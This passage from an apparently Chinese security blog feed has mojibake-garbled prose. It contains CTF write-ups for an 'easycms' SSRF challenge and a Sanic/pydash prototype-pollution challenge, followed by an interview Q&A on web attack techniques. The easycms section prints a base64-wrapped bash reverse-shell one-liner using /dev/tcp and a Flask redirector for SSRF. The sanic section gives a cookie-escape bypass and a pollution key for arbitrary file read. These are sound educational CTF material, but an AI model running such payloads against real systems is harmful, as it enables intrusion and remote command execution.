title="easycms"></a>easycms</h2><p>è¿™ä¸ªé¢˜çœŸæ˜¯å¿…é¡»è¦çœ‹åˆ°hintæ‰çŸ¥é“æ€ä¹ˆåšï¼Œhintæç¤ºflag.phpçš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåœ°æ–¹ REMOTE_ADDR æ˜¯æ²¡åŠæ³•é€šè¿‡æ–‡ä»¶å¤´ä¼ªé€ çš„ã€‚é‚£å°±åªèƒ½è¯•ä¸€è¯•ssrfäº†ã€‚</p><p>è¿™é“é¢˜ssrfçš„æ€è·¯æ˜¯è¿™æ ·ï¼šé€šè¿‡ä¸€ä¸ªå€Ÿå£æ¥è®¿é—®ä¸€ä¸ªæ¶æ„æœåŠ¡å™¨ï¼Œæ¶æ„æœåŠ¡å™¨302å°†è¯·æ±‚è·³è½¬åˆ°è®¿é—®è€…æœ¬åœ°çš„flag.phpæ¥é€šè¿‡ REMOTE_ADDR çš„æ£€æµ‹ã€‚</p><p>githubä¸Šæ‰¾ä¸€ä¸‹æºç ï¼Œå®¡è®¡ä¸€ä¸‹ï¼ˆå…¶å®è¿™é‡Œæœ‰å·²ç»çº°æ¼çš„æ¼æ´ï¼Œä½†æ˜¯å½“æ—¶æ²¡æ‰¾åˆ°ï¼Œåªèƒ½å®¡äº†ï¼‰æœäº†ä¸€ä¸‹ssrfå‡ºå‘æ¼æ´çš„å¸¸è§å‡½æ•°ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªfile_get_contents()ã€‚æ‰¾ä¸€ä¸‹è¿™ä¸ªå‡½æ•°å‚æ•°å¯æ§çš„åœ°æ–¹ã€‚æ‰¾åˆ°äº†å¦‚ä¸‹ä»£ç ï¼š</p><p><img src="/images/dr.png" alt="img3"></p><p>ç»§ç»­å¯»æ‰¾è¿™ä¸ªå‡½æ•°å‚æ•°å¯æ§çš„åœ°æ–¹ï¼š</p><p><img src="/images/qrcode.png" alt="img4"></p><p>è¿™ä¸ªåœ°æ–¹çš„urlæ˜¯getæ–¹æ³•ä¼ å…¥çš„ï¼Œå¾ˆæœ‰æˆã€‚ç»§ç»­æ‰¾ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†è¿™ä¸ªåœ°æ–¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dr_qrcode</span>(<span class="params"><span class="variable">$text</span>, <span class="variable">$thumb</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$level</span> = <span class="string">&#x27;H&#x27;</span>, <span class="variable">$size</span> = <span class="number">5</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ROOT_URL.<span class="string">&#x27;index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$thumb</span>).<span class="string">&#x27;&amp;text=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$text</span>).<span class="string">&#x27;&amp;size=&#x27;</span>.<span class="variable">$size</span>.<span class="string">&#x27;&amp;level=&#x27;</span>.<span class="variable">$level</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç†è®ºä¸Šè®²è®¿é—®è¿™ä¸ªurlï¼Œæ§åˆ¶ä¸‹thumbçš„å€¼å°±å¯ä»¥è®¿é—®åˆ°å’±ä»¬çš„æ¶æ„æœåŠ¡å™¨äº†ã€‚åœ¨æœåŠ¡å™¨ä¸Šéƒ¨ç½²ä¸€ä¸ª302è·³è½¬ç«™ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,redirect,request,send_file</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    cmd= <span class="string">&quot;cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;http://127.0.0.1/flag.php?cmd=&quot;</span>+cmd)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>ä¸ç†Ÿä¹‹åæœ¬åœ°è®¿é—®ä¸€ä¸‹ï¼Œè·³è½¬åˆ°flag.phpå°±è¯´æ˜å·²ç»æˆåŠŸéƒ¨ç½²äº†ã€‚è¿™ä¹Ÿå°±ä¸éš¾ç†è§£ä¸ºä»€ä¹ˆè¿™ä¸ªæœåŠ¡å¯ä»¥é€šè¿‡flag.phpçš„æ£€æµ‹äº†ã€‚ç”±äºæ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦å¼¹ä¸€ä¸‹shellã€‚</p><p>è¿™é‡Œç”¨åˆ°å¼¹shellçš„å§¿åŠ¿å¦‚ä¸‹ï¼š</p><blockquote><p>quote(â€œbash -c â€˜{echo,base64_str}|{base64,-d}|{bash,-i}â€™â€)</p></blockquote><p>å…¶ä¸­ï¼Œbase64_stråŠ å¯†çš„å†…å®¹å¦‚ä¸‹ï¼š</p><blockquote><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</p></blockquote><p>æ¥ç€æŒ‰ç…§ä¸Šé¢çš„urlè®¿é—®&#x2F;index.php?s&#x3D;api&amp;c&#x3D;api&amp;m&#x3D;qrcode&amp;thumb&#x3D;<a href="http://vps:port&amp;&amp;text=foo&amp;size=1&amp;level=1å³å¯">http://vps:port&amp;&amp;text=foo&amp;size=1&amp;level=1å³å¯</a></p><h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="comment">#å°†userèµ‹å€¼ä¸ºcookieä¸­çš„user</span></span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line">    <span class="comment">#å¦‚æœuserä¸º&#x27;adm;n&#x27;å°±æŠŠsessionä¸­çš„adminé¡¹èµ‹å€¼ä¸ºtrue</span></span><br><span class="line">    <span class="comment">#ä½†é—®é¢˜æ˜¯ï¼Œcookieä¸­çš„åˆ†å·ä¼šè¢«è§†ä¸ºä¸¤ä¸ªå€¼ä¹‹é—´çš„åˆ†å‰²</span></span><br><span class="line">    <span class="comment">#è¿™æ˜¯ç¬¬ä¸€ä¸ªè¦è§£å†³çš„é—®é¢˜</span></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"><span class="comment">#æˆåŠŸç™»é™†åå¯ä»¥æ±¡æŸ“è¿™é‡Œçš„fileæ–‡ä»¶æ¥è¾¾åˆ°ä»»æ„æ–‡ä»¶è¯»å–</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªé—®é¢˜æ¯”è¾ƒå¥½è§£å†³ï¼Œç¿»é˜…githubä¸­sanicçš„æºç å¯ä»¥å‘ç°ï¼Œåœ¨å¤„ç†cookieéƒ¨åˆ†ï¼Œ<strong>sanicä¼šå°†cookieä¸­çš„å…«è¿›åˆ¶è¿›è¡Œè§£ç </strong>ï¼Œæ ¹æ®è¿™ä¸€ç‰¹æ€§ï¼Œå°†cookieèµ‹å€¼ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=adm\073n</span><br></pre></td></tr></table></figure><p>å³å¯</p><p>ä¸‹ä¸€ä¸ªé—®é¢˜æ˜¯pythonåŸå‹é“¾æ±¡æŸ“çš„é—®é¢˜ï¼Œè¿™é‡Œå‡†ç¡®çš„è¯´æ˜¯ä¸€ä¸ªpydashçš„åŸå‹é“¾æ±¡æŸ“é—®é¢˜ã€‚æºä»£ç ä¸­çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pydash.set_(pollute, key, value)</span><br></pre></td></tr></table></figure><p>å­˜åœ¨åŸå‹é“¾æ±¡æŸ“çš„é£é™©ã€‚è¿™é‡Œç›´æ¥å¯¹keyä¼ å…¥__class__.__init__.__globals__.__file__å°±å¯ä»¥æ“æ§ä»£ç ä¸­çš„fileå˜é‡å®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><p>ä½†æ˜¯åœ¨æºä»£ç ä¸­è¿‡æ»¤äº†._ï¼Œè¿™é‡Œéœ€è¦åšä¸€ä¸‹ç»•è¿‡ã€‚è·Ÿè¿›ä¸€ä¸‹ç›¸åº”ç‰ˆæœ¬çš„pydashæºç ï¼Œä¼šå‘ç°å¯ä»¥é€šè¿‡\\.æ¥å½“ä½œ.ä½¿ç”¨ï¼Œè¿™æ ·å°±å¯ä»¥åšåˆ°ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><p>è‡³æ­¤çš„éš¾åº¦éƒ½è¿˜åœ¨ç¬”è€…çš„é¢„æ–™ä¹‹å†…ï¼Œä½†æ˜¯ç”±äºä¸çŸ¥é“flagæ–‡ä»¶åç§°ï¼Œè¿˜è¦é€šè¿‡æŒ–æ˜pydashæºç ä¸­çš„é“¾å­æ¥è¿›è¡Œåˆ—ç›®å½•ã€‚è¿™é‡Œç›´æ¥æ”¾ä¸€ä¸ªgxnå¸ˆå‚…çš„åšå®¢ï¼Œå°±ä¸å†è¯¦ç»†å†™äº†ï¼Œå¤ªéš¾äº†qaq</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å›½æŠ¤é¢è¯•ç»éªŒåˆ†äº«</title>
      <link href="/2024/07/02/%E5%9B%BD%E6%8A%A4%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"/>
      <url>/2024/07/02/%E5%9B%BD%E6%8A%A4%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="å›½æŠ¤é¢è¯•ç»å†"><a href="#å›½æŠ¤é¢è¯•ç»å†" class="headerlink" title="å›½æŠ¤é¢è¯•ç»å†"></a>å›½æŠ¤é¢è¯•ç»å†</h1><p>ç¬”è€…åœ¨2024å¹´çš„å›½æŠ¤ä¸­æ‰¾äº†ä¸€å®¶ä¸­é—´å•†åšé¢è¯•ï¼Œè™½ç„¶å¾—åˆ°äº†è“åˆï¼Œä½†æ˜¯ç”±äºå»å¹´å›½æŠ¤ä¸€äº›ä¼—æ‰€å‘¨çŸ¥çš„åŸå› ï¼Œä»¥åŠä»Šå¹´å›½æŠ¤å½¢å¼çš„å˜åŠ¨ï¼Œæ²¡æœ‰èƒ½æˆåŠŸå‚åŠ ä»Šå¹´çš„å›½æŠ¤ï¼Œæ¯”è¾ƒå¯æƒœï¼Œç°åœ¨å›½æŠ¤å·²ç»ç»“æŸï¼Œæ€»ç»“ä¸€ä¸‹é¢è¯•é¢˜ç›®ã€‚</p><h3 id="é—®ï¼šæ‰“è¿‡å†…ç½‘å—ï¼Œä»€ä¹ˆæ€è·¯"><a href="#é—®ï¼šæ‰“è¿‡å†…ç½‘å—ï¼Œä»€ä¹ˆæ€è·¯" class="headerlink" title="é—®ï¼šæ‰“è¿‡å†…ç½‘å—ï¼Œä»€ä¹ˆæ€è·¯"></a>é—®ï¼šæ‰“è¿‡å†…ç½‘å—ï¼Œä»€ä¹ˆæ€è·¯</h3><p>çœŸæ²¡æ‰“è¿›å»è¿‡ï¼Œåªåœ¨æ¯”èµ›é‡Œç”¨è¿‡fscanğŸ˜­ã€‚è¿™ä¸ªä»¥åèƒ½æœ‰ç”Ÿäº§ç¯å¢ƒçš„shellå†å­¦å§</p><h3 id="é—®ï¼šsqlæ³¨å…¥åˆ†å“ªå‡ ç±»"><a href="#é—®ï¼šsqlæ³¨å…¥åˆ†å“ªå‡ ç±»" class="headerlink" title="é—®ï¼šsqlæ³¨å…¥åˆ†å“ªå‡ ç±»"></a>é—®ï¼šsqlæ³¨å…¥åˆ†å“ªå‡ ç±»</h3><p>å››å¤§åŸºæœ¬æ³¨å…¥ç±»å‹åˆ†åˆ«ä¸ºï¼šè”åˆæ³¨å…¥ã€ç›²æ³¨ã€å †å æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥ã€‚<br>è”åˆæ³¨å…¥ï¼šé€šè¿‡unionè¯­å¥è¿›è¡Œæ³¨å…¥<br>ç›²æ³¨ï¼šé€šè¿‡å»¶æ—¶æˆ–è¿”å›å¸ƒå°”å€¼è¿›è¡Œæ³¨å…¥<br>å †å æ³¨å…¥ï¼šé€šè¿‡è¯­è¨€ç‰¹æ€§ä¸€æ¬¡æ€§æ‰§è¡Œå¤šæ¡sqlè¯­å¥è¿›è¡Œæ³¨å…¥<br>æŠ¥é”™æ³¨å…¥ï¼šé€šè¿‡æ¶æ„è¯­å¥ä½¿æŠ¥é”™å†…å®¹å«æœ‰ä¸€å®šä¿¡æ¯è¿›è¡Œæ³¨å…¥ã€‚</p><h3 id="é—®ï¼šsqlæ³¨å…¥çš„äºŒæ¬¡æ³¨å…¥åŸç†å’Œä¿®ç†æ‰‹æ³•"><a href="#é—®ï¼šsqlæ³¨å…¥çš„äºŒæ¬¡æ³¨å…¥åŸç†å’Œä¿®ç†æ‰‹æ³•" class="headerlink" title="é—®ï¼šsqlæ³¨å…¥çš„äºŒæ¬¡æ³¨å…¥åŸç†å’Œä¿®ç†æ‰‹æ³•"></a>é—®ï¼šsqlæ³¨å…¥çš„äºŒæ¬¡æ³¨å…¥åŸç†å’Œä¿®ç†æ‰‹æ³•</h3><p>äºŒæ¬¡æ³¨å…¥æŒ‡çš„æ˜¯ï¼Œwebåº”ç”¨ç°å°†æ¶æ„è¯­å¥å­˜å…¥äº†æ•°æ®åº“ï¼Œåœ¨åé¢çš„æŸäº›æ­¥éª¤ä¸­ï¼Œåˆå°†è¿™æ¡è¯­å¥å–å‡ºï¼Œå¯¼è‡´äº†ä¸€äº›å®‰å…¨éšæ‚£ã€‚æ¯”å¦‚åœ¨æ›´æ”¹å¯†ç å‡ºä»»æ„å¯†ç é‡ç½®çš„é—®é¢˜ã€‚</p><p>æƒ³è¦ä¿®å¤äºŒæ¬¡æ³¨å…¥ï¼Œå°±éœ€è¦å¯¹æ¥è‡ªç”¨æˆ·æˆ–è€…æ¥è‡ªå­˜å‚¨çš„è¾“å…¥éƒ½åšè½¬ä¹‰è¿‡æ»¤ã€‚</p><h3 id="é—®ï¼šsqlæŠ¥é”™æ³¨å…¥ä¸»è¦ç”¨åˆ°çš„å‡½æ•°"><a href="#é—®ï¼šsqlæŠ¥é”™æ³¨å…¥ä¸»è¦ç”¨åˆ°çš„å‡½æ•°" class="headerlink" title="é—®ï¼šsqlæŠ¥é”™æ³¨å…¥ä¸»è¦ç”¨åˆ°çš„å‡½æ•°"></a>é—®ï¼šsqlæŠ¥é”™æ³¨å…¥ä¸»è¦ç”¨åˆ°çš„å‡½æ•°</h3><p>updatexmlï¼Œextractvalueå’Œfloor</p><h3 id="é—®ï¼šå†…ç½‘å‘ç°ä¸€å°ä¸»æœºåœ¨å¤§é‡æ”»å‡»å…¶ä»–ä¸»æœºçš„445ç«¯å£ï¼Œå¦‚ä½•é‰´åˆ«å…¶æ”»å‡»ç±»å‹"><a href="#é—®ï¼šå†…ç½‘å‘ç°ä¸€å°ä¸»æœºåœ¨å¤§é‡æ”»å‡»å…¶ä»–ä¸»æœºçš„445ç«¯å£ï¼Œå¦‚ä½•é‰´åˆ«å…¶æ”»å‡»ç±»å‹" class="headerlink" title="é—®ï¼šå†…ç½‘å‘ç°ä¸€å°ä¸»æœºåœ¨å¤§é‡æ”»å‡»å…¶ä»–ä¸»æœºçš„445ç«¯å£ï¼Œå¦‚ä½•é‰´åˆ«å…¶æ”»å‡»ç±»å‹"></a>é—®ï¼šå†…ç½‘å‘ç°ä¸€å°ä¸»æœºåœ¨å¤§é‡æ”»å‡»å…¶ä»–ä¸»æœºçš„445ç«¯å£ï¼Œå¦‚ä½•é‰´åˆ«å…¶æ”»å‡»ç±»å‹</h3><p>è¿™é‡Œä¸å¤ªç¡®å®šï¼Œ445ç«¯å£é¦–å…ˆå¯ä»¥åˆ©ç”¨æ°¸æ’ä¹‹è“ï¼Œå…¶æ¬¡ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹ï¼Œ445ç«¯å£å¥½åƒä¸»è¦æ˜¯winç³»ç»Ÿçš„smbæœåŠ¡ï¼Œå¯èƒ½ä¼šæœ‰çˆ†ç ´è¿æ¥å°è¯•è¿œç¨‹è®¿é—®ã€‚</p><h3 id="é—®ï¼šä¸»æµshellç®¡ç†å·¥å…·æµé‡ç‰¹å¾"><a href="#é—®ï¼šä¸»æµshellç®¡ç†å·¥å…·æµé‡ç‰¹å¾" class="headerlink" title="é—®ï¼šä¸»æµshellç®¡ç†å·¥å…·æµé‡ç‰¹å¾"></a>é—®ï¼šä¸»æµshellç®¡ç†å·¥å…·æµé‡ç‰¹å¾</h3><p>ç½‘ä¸Šç›¸å…³çš„åšå®¢å¾ˆå¤šï¼Œä¸å†èµ˜è¿°äº†</p><h3 id="é—®ï¼šæ€åŠ¿æ„ŸçŸ¥è®¾å¤‡æŠ¥é”™ï¼Œå¦‚ä½•åˆ¤æ–­å…¶æ˜¯å¦ä¸ºè¯¯æŠ¥"><a href="#é—®ï¼šæ€åŠ¿æ„ŸçŸ¥è®¾å¤‡æŠ¥é”™ï¼Œå¦‚ä½•åˆ¤æ–­å…¶æ˜¯å¦ä¸ºè¯¯æŠ¥" class="headerlink" title="é—®ï¼šæ€åŠ¿æ„ŸçŸ¥è®¾å¤‡æŠ¥é”™ï¼Œå¦‚ä½•åˆ¤æ–­å…¶æ˜¯å¦ä¸ºè¯¯æŠ¥"></a>é—®ï¼šæ€åŠ¿æ„ŸçŸ¥è®¾å¤‡æŠ¥é”™ï¼Œå¦‚ä½•åˆ¤æ–­å…¶æ˜¯å¦ä¸ºè¯¯æŠ¥</h3><h3 id="é—®ï¼šæ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ‰‹æ³•"><a href="#é—®ï¼šæ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ‰‹æ³•" class="headerlink" title="é—®ï¼šæ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ‰‹æ³•"></a>é—®ï¼šæ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ‰‹æ³•</h3><p>ä¸»è¦åˆ†é»‘ç™½åå•ä¸¤ç§æƒ…å†µï¼Œå„æœ‰å„çš„ç»•è¿‡æ‰‹æ³•ï¼Œç½‘ä¸Šä¹Ÿå¾ˆå¤š</p><h3 id="é—®ï¼šshiroååºåˆ—åŒ–"><a href="#é—®ï¼šshiroååºåˆ—åŒ–" class="headerlink" title="é—®ï¼šshiroååºåˆ—åŒ–"></a>é—®ï¼šshiroååºåˆ—åŒ–</h3><p>shiroæŒ‡çš„æ˜¯apache shiroæ¡†æ¶ï¼Œæ¡†æ¶ä¸­çš„RememberMeåŠŸèƒ½ä¼šæŠŠç™»é™†æˆåŠŸçš„ç”¨æˆ·ç»è¿‡åŠ å¯†çš„cookieå­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œå¹¶ä¸”åœ¨è§£å¯†ä¹‹åè¿›è¡Œååºåˆ—åŒ–ï¼Œè¿™å°±å¯èƒ½å¯¼è‡´rceã€‚åŠ è§£å¯†è¿‡ç¨‹ä¸­æ¶‰åŠäº†aesï¼Œå› æ­¤æ„é€ payloadéœ€è¦çŸ¥é“aesçš„å¯†é’¥ã€‚</p><h3 id="é—®ï¼šå†…å­˜é©¬æŸ¥æ€"><a href="#é—®ï¼šå†…å­˜é©¬æŸ¥æ€" class="headerlink" title="é—®ï¼šå†…å­˜é©¬æŸ¥æ€"></a>é—®ï¼šå†…å­˜é©¬æŸ¥æ€</h3><p><a href="https://blog.csdn.net/SimoSimoSimo/article/details/127700190">https://blog.csdn.net/SimoSimoSimo/article/details/127700190</a><br>ä¸å¤ªæ‡‚ï¼Œæ„Ÿè§‰è¿™ç¯‡è®²çš„ä¸é”™</p><h3 id="é—®ï¼šåŸå‹é“¾æ±¡æŸ“"><a href="#é—®ï¼šåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="é—®ï¼šåŸå‹é“¾æ±¡æŸ“"></a>é—®ï¼šåŸå‹é“¾æ±¡æŸ“</h3><p>è§ä¸»é¡µJSåŸå‹é“¾æ±¡æŸ“</p><h3 id="é—®ï¼šç»•æ²¡ç»•è¿‡360ï¼Œæœ‰ä»€ä¹ˆæ€è·¯"><a href="#é—®ï¼šç»•æ²¡ç»•è¿‡360ï¼Œæœ‰ä»€ä¹ˆæ€è·¯" class="headerlink" title="é—®ï¼šç»•æ²¡ç»•è¿‡360ï¼Œæœ‰ä»€ä¹ˆæ€è·¯"></a>é—®ï¼šç»•æ²¡ç»•è¿‡360ï¼Œæœ‰ä»€ä¹ˆæ€è·¯</h3>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
